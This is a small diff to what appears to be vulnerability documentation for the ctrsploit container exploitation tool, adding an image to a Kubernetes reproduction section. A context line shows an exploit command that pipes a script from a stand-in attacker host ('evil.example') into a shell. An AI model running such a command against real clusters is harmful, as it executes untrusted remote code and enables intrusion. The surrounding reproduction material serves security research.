@@ -37,6 +37,8 @@ ctrsploit vul kubeconfig user-exec exploit -c 'curl http://evil.example/sh | sh'
 
 ## 5. Reproduce
 
+![](./video.svg)
+
 ### 5.1 Reproduce Environment
 
 [dqd: kubernetes/v1.35.1](https://github.com/ctrsploit/dqd/tree/main/kubernetes/v1.35.1/containerd/v2.2.1/calico/default)
